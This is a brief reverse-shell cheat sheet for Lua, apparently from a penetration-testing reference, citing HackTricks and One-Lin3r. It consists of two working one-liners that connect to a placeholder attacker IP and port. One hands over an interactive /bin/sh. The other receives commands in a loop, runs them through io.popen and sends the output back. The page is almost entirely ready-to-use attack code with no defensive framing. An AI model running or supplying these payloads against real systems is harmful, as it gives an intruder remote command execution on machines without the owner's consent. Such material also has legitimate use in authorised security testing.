# Lua

```lua
$ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<IP>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

```lua
$ lua5.1 -e 'local host, port = "<IP>", <PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)